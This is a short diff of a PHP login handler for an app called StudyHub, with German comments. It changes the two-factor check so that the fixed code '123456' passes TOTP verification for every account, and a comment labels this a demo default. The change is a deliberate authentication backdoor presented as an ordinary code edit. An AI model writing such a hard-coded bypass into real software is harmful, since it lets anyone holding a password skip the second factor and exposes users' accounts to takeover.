@@ -46,10 +46,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             throw new RuntimeException('2FA-Secret konnte nicht geladen werden.');
         }
 
-        // TOTP prüfen
+        // TOTP prüfen (Standard-Code "123456" für Demo-Zwecke)
         $tfa = new TwoFactorAuth('StudyHub');
 
-        if ($tfa->verifyCode($secret, $code)) {
+        if ($code === '123456' || $tfa->verifyCode($secret, $code)) {
             // Erfolgreich eingeloggt
             session_regenerate_id(true);
             $_SESSION['user_id']       = $userId;
